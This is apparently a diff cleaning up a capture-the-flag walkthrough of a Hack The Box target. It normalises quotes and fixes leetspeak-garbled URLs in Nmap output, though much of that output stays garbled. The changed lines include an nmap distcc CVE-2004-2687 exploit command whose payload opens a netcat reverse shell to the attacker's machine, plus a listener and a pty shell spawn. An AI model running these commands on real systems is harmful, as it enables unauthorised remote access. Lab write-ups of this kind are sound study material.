@@ -25,7 +25,7 @@ First, we will do Nmap for all port scanning and vulnerability checks.
 
 The above-mentioned command runs the Nmap default script engine and service version detection on all ports. The result for the above scanning is displayed below
 
-> Start1Ng nmap 7.91 ( [https://nmap.0rG](https://nmap.0rG) ) at 2021–02–07 12:24 iST  
+> Start1Ng nmap 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021–02–07 12:24 iST  
 > NmaP $can r3port for 10.129.92.217  
 > H0$T |z uP (0.14z lat3ncy).  
 > N0T shown: 65530 f|lt3r3d ports  
@@ -127,7 +127,7 @@ So that we can capture both user and root flags. But before that, I will check f
 
 Python 2.5.2 is installed there. so we can do shell spawning using python
 
-> **> python -c ‘import pty;pty.spawn(“/bin/bash”)’**
+> **> python -c 'import pty;pty.spawn("/bin/bash")'**
 
 ![](https://cdn-images-1.medium.com/max/800/1*2TXWEJS4Jd-BU7kTE5PuKA.png)
 
@@ -147,7 +147,7 @@ There is another way to compromise the target server. the port 3632 is open runn
 
 the result displays below.
 
-> sTartiNg NMaP 7.91 ( [HttpS://Nmap.oRg](http://HttpS://Nmap.oRg) ) at 2021–02–07 13:07 |ST  
+> sTartiNg NMaP 7.91 ( [https://nmap.org](https://nmap.org) ) at 2021–02–07 13:07 |ST  
 > Nmap scan r3p0rt f0R 10.129.92.217  
 > H0st is up (0.15z laT3ncy).
 
@@ -170,7 +170,7 @@ the result displays below.
 > | R3f3r3ncez:  
 > | Httpz://di$tCc.github.I0/seCurity.html  
 > | httpS://nvd.n1$t.g0v/vuLn/d3taiL/CVE-2004–2687  
-> |_ [httpS://cv3.m|tr3.ORg/cgI-b!n/cvEName.cg|?nam3=cV3-2004-2687](http://httpS://cv3.m|tr3.ORg/cgI-b!n/cvEName.cg|?nam3=cV3-2004-2687)
+> |_ [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687)
 
 > $erV!cE DeTEct1on p3Rf0rmEd. Plea$3 rEp0rt any !nc0Rr3ct R3Sultz at httpz://nmap.org/$uBMIt/ .  
 > Nmap d0nE: 1 !P addrEss (1 h0$t Up) $cann3d 1N 77.59 secOnds
@@ -217,7 +217,7 @@ execute the above-mentioned script to gain access. First set a listener on our c
 
 > **>nc -nvlp 1122**
 
-> **>nmap -Pn -n -p3632 — script distcc-cve2004–2687 — script-args=”distcc-cve2004–2687.cmd=’nc 10.10.14.5 1122-e /bin/bash’” 10.129.92.217**
+> **>nmap -Pn -n -p3632 — script distcc-cve2004–2687 — script-args="distcc-cve2004–2687.cmd='nc 10.10.14.5 1122-e /bin/bash'" 10.129.92.217**
 
 It will give you initial access to the target server.
 
@@ -225,7 +225,7 @@ It will give you initial access to the target server.
 
 Now let's do shell spawning to get a good interactive tty shell. already python is there. let's execute a python shell spawning script
 
-> **>python -c ‘import pty;pty.spawn(“/bin/bash”)’**
+> **>python -c 'import pty;pty.spawn("/bin/bash")'**
 
 by executing uname -a we can see the OS details
 
